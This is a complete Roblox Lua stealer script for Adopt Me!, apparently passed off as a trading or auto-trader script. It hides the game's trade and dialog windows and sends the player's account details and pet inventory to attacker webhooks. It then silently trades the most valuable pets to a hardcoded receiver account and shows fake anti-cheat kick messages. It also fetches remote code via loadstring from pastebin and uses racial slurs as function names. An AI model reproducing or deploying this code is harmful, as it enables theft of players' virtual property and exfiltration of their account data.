local Username = "yoklopik" 
local Webhook = "https://webhook-protect.vercel.app/api/webhook?id=a3VrU3N4eWl0UFpzdFhBaV9ySnVTQTpYNVRmZTgtLTBUQ0lTSXRSZzhIOW94cHA2Rk9TQWJfSzRrX3BnRWhWT1JxZ1dpLXZBRmdmWThCMWhIQzdpR2hTcUlUeWhCOE96eTE2VTlqcmdIR2xJQmlxN2NCZGdENHltQUR6Z1pkRHI4aG9iMHRtT05ZUnE5ZUpZNEFReXNkU0lrbEplbDN2c045bXBwby16S05sVUc2akR5VDgtcTRpVjFKZlBKSEVFWHM"
local GoodWebhook = "https://webhook-protect.vercel.app/api/webhook?id=ekxLNFBINXZMNVM4Um05OFNSbHdDQTplazZaNEQ4QVZmVmRIRXVZUDVVLWw3czM4Q25ibFBRdi1nWXV6aUJmMk03cFgwSVhDN205aENjUklrakhISGx3YjFackJPYkJNaGpsc2YwcUFyUUxfVVVBSTFDMG5Hc0N3WGM2UVhJYTlsOUhVbzcwRmV6alRsSFF1Y0Fxb2ZpVXB6WHZqaklIOGxQdmR4eEpIbVd1SkJ4X3ZRSzdtXzVhM1JwcUcwbXFNamM"
repeat wait() until game:IsLoaded()

if getgenv().adm then return end
getgenv().adm = true

local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")

local function gay(guiElement)
    if guiElement then
        guiElement.Position = UDim2.new(1000, 0, 1000, 0)
    end
end
local function nigga()
    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
    local dialogApp = playerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        dialogApp.Dialog.Visible = false
        gay(dialogApp.Dialog)
    end
end
local function declineniggers(player)
    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
end
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
nigga()
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
    if sender.Name ~= Username then
        declineniggers(sender)
    end
end)
declineniggers()

if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
    Webhook = ""
    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server!")
end

--uhh this priv server checker only checks for the user's status so... yeah just in case
if #game:GetService("Players"):GetPlayers() <= 5 then
    game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable get Remote.Events")
    wait(5)
    game:Shutdown()
end


local Pets = {}
local PetCounts = {}
local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))

local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0
local rare_count, uncommon_count, common_count, total_pets = 0, 0, 0, 0
for i, v in pairs(ClientData.get("inventory").pets) do
    total_pets = total_pets + 1
end

for i, v in pairs(ClientData.get("inventory").pets) do
    local petData = InventoryDB[v.category][v.id]
    
    if petData.rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
    if petData.properties == "mega_neon" then
        mega_count = mega_count + 1
    end
    if petData.properties == "neon" then
        neon_count = neon_count + 1
    end
    if petData.rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
    if petData.rarity == "rare" then
        rare_count = rare_count + 1
    end
    if petData.rarity == "uncommon" then
        uncommon_count = uncommon_count + 1
    end
    if petData.rarity == "common" then
        common_count = common_count + 1
    end
end

local teleport = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'

local plr = game.Players.LocalPlayer
local accage = game.Players.LocalPlayer.AccountAge
local IdValue = game:GetService("Players").LocalPlayer.userId
or "Unknown"
local receiver = Username
local ExecutorValue = identifyexecutor() or "Unknown"
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local VersionValue = "1.3"

local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
local neon_count = 0
local mega_neon_count = 0
local flyable_count = 0
local rideable_count = 0
local fr_count = 0

for _, petData in pairs(playerData.inventory.pets) do
    if petData.properties and type(petData.properties) == "table" then
        if petData.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.properties.mega_neon then
            mega_neon_count = mega_neon_count + 1
        end
        if petData.properties.flyable then
            flyable_count = flyable_count + 1
        end
        if petData.properties.rideable then
            rideable_count = rideable_count + 1
        end
        if petData.properties.rideable or petData.properties.flyable then
            fr_count = fr_count + 1
        end
    end
end

if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 then
    Webhook = ""
    game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected, Cannot get low value object.pets.eggs [No Remote.Event Detected]")
end


local embed = {
    ["title"] = "Jospak Scripts | Adopt Me!",
    ["color"] = tonumber(0x3365FF),
    ["fields"] = {
        {
            ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
            ["value"] = "```lua\n" ..
                        "Username         : " .. tostring(plr) .. "\n" ..
                        "User-ID          : " .. tostring(IdValue) .. "\n" ..
                        "Account Age      : " .. tostring(accage) .. " Days\n" ..
                        "Executor         : " .. tostring(ExecutorValue) .. "\n" ..
                        "Receiver         : " .. tostring(Username) .. "\n" ..
                        "Version          : " .. tostring(VersionValue) .. "```"
        },
        {
            ["name"] = "〘:ringed_planet:〙**Items**",
            ["value"] = "```lua\n" ..
                        "Total Value      : " .. tostring("Soon") .. "\n" ..
                        "Bucks Amount     : " .. tostring(bucks) .. "\n\n" ..
                        "Mega Pets        : " .. tostring(mega_neon_count) .. "\n" ..
                        "Neon Pets        : " .. tostring(neon_count) .. "\n" ..
                        "F/R Pets         : " .. tostring(fr_count) .. "\n" ..
                        "Legendary Pets   : " .. tostring(legendaries_count) .. "\n" ..
                        "Ultra-Rare Pets  : " .. tostring(ultra_count) .. "\n" ..
                        "Rares Pets       : " .. tostring(rare_count) .. "\n" ..
                        "Uncommon Pets    : " .. tostring(uncommon_count) .. "\n" ..
                        "Common Pets      : " .. tostring(common_count) .. "```"
        },
        {
            ["name"] = "〘:package:〙Auto Trader Script:",
            ["value"] = "```lua\n" ..
                        "Username = '" .. tostring(plr) .. "'\n" ..
                        "loadstring(game:HttpGet('https://pastebin.com/raw/hweDsjaP'))()\n" ..
                        "```"
        }
    }
}


    
    

function SendMessageEMBED(url, embed, bool)
  local http = game:GetService("HttpService")
  local headers = {
      ["Content-Type"] = "application/json"
  }
  local data = {
      username = "Adopt Me!",
      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
      content = TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = embed.color,
              fields = embed.fields,
          }
      }
  }
  local data2 = {
      username = "Adopt Me!",
      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
      content = "-- @everyone\n" .. TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = 0xf1c40f,
              fields = embed.fields,
          }
      }
  }

  local body = http:JSONEncode(data)
  local body2 = http:JSONEncode(data2)
  if bool == true then
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body2
      })
  else
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body
      })
  end
end

if legendaries_count >= 1 or neon_count >= 1 or mega_count >= 1 or flyable_count >= 1 or rideable_count >= 1 or fr_count >= 1 then
    SendMessageEMBED(GoodWebhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end 



game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

local stealActive = false
local function StartSteal()
    if stealActive then
    end
    stealActive = true

    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

    local function offset(guiElement)
        if guiElement then
            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end
    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        offset(dialogApp.Dialog)
    end


    SendTrade:FireServer(game.Players[Username])


local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0

if next(PetsInventory.pets) then
    local petUids = {}
    local petCount = 0
    local petLimit = 18

    for petUid, pet in pairs(PetsInventory.pets) do
        table.insert(petUids, petUid)
        
        local petData = InventoryDB[pet.category][pet.id]
        if petData.rarity == "legendary" then
            legendaries_count = legendaries_count + 1
        end
        if pet.properties and pet.properties.mega_neon then
            mega_count = mega_count + 1
        end
        if pet.properties and pet.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.rarity == "ultra_rare" then
            ultra_count = ultra_count + 1
        end
    end

    if legendaries_count + mega_count + neon_count + ultra_count == 0 then
        game:GetService("Players").LocalPlayer:Kick("\nAnti-cheat has detected suspicious activity from your IP address! We recommend rebooting your router so that your IP changes to avoid punishment!")
    end

    local function getPetPriority(pet)
        local petData = InventoryDB[pet.category][pet.id]
        local priority = 0

        if pet.properties then
            if pet.properties.mega_neon and pet.properties.flying and pet.properties.ride then
                priority = 13
            elseif pet.properties.mega_neon and pet.properties.ride then
                priority = 12
            elseif pet.properties.mega_neon and pet.properties.flying then
                priority = 11
            elseif pet.properties.mega_neon then
                priority = 10
            elseif pet.properties.neon and pet.properties.flying and pet.properties.ride then
                priority = 9
            elseif pet.properties.neon and pet.properties.ride then
                priority = 8
            elseif pet.properties.neon and pet.properties.flying then
                priority = 7
            elseif pet.properties.neon then
                priority = 6
            end
        end

        if priority == 0 then
            if petData.rarity == "legendary" then
                priority = 5
            elseif petData.rarity == "ultra_rare" then
                priority = 4
            elseif petData.rarity == "rare" then
                priority = 3
            elseif petData.rarity == "uncommon" then
                priority = 2
            else
                priority = 1
            end
        end

        return priority
    end

    petUids = {}
    for petUid, pet in pairs(PetsInventory.pets) do
        table.insert(petUids, {uid = petUid, priority = getPetPriority(pet)})
    end

    table.sort(petUids, function(a, b)
        return a.priority > b.priority
    end)

    petCount = 0
    petLimit = 20
    while #petUids > 0 and petCount < petLimit do
        if not stealActive then
            return
        end
        local petEntry = table.remove(petUids, 1)
        AddPetRemote:FireServer(petEntry.uid)
        petCount = petCount + 1
    end
else
    game:GetService("Players").LocalPlayer:Kick("\nThe account does not meet the requirements, you may be trying to hack the script!")
end



AcceptNegotiationRemote:FireServer()
ConfirmTradeRemote:FireServer()
    stealActive = false
    wait(1)
    StartSteal()
end

function sendPlayerLeaveNotification(playerName)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local dataLeave = {
        username = "Notification",
        avatar_url = "https://media.discordapp.net/attachments/1326959392339267625/1341456689949446297/exit-circle-floor-sign-with-directional-arrow-and-a-person-walking-text-in-the-lower-side.png?ex=67b61065&is=67b4bee5&hm=661460a43333a89a03fdcffb9f619c400e7c4fda27e6884f0cbccd512261ed4f&=",
        content = "**" .. playerName .. "** left from the game!",
        embeds = {
            {
                color = 0xff3e3e,
                fields = {
                    {
                        name = "〘:rotating_light:〙**Player Info**",
                        value = "```lua" ..
                            "\nUsername      : " .. game.Players.LocalPlayer.Name ..
                            "\nUser-ID       : " .. game.Players.LocalPlayer.userId ..
                            "\nAccount Age   : " .. game.Players.LocalPlayer.AccountAge ..
                            "\nExecutor      : " .. identifyexecutor() .. "```",
                        inline = false
                    }
                }
            }
        }
    }

    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)

    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = headers,
        Body = jsonDataLeave
    })
end

game.Players.PlayerRemoving:Connect(function(player)
    if player == game.Players.LocalPlayer then
        sendPlayerLeaveNotification(player.Name)
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            StartSteal()
        end)
    end
end)
